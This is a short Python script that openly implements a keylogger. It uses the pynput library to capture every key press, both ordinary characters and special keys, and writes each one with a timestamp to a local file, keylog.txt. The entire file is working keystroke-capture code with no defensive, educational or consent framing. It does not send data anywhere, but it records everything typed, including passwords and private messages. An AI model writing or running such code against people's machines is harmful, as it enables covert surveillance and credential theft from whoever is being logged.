from pynput.keyboard import Listener
import logging

#log pressed keys in keylog.txt
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        #for regular keys
        logging.info(f"Key {key.char}")
    except AttributeError:
        #for special keys
        logging.info(f"Special key {key}")
#start keylogger
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()
#main
if __name__ == "__main__":
    start_keylogger()
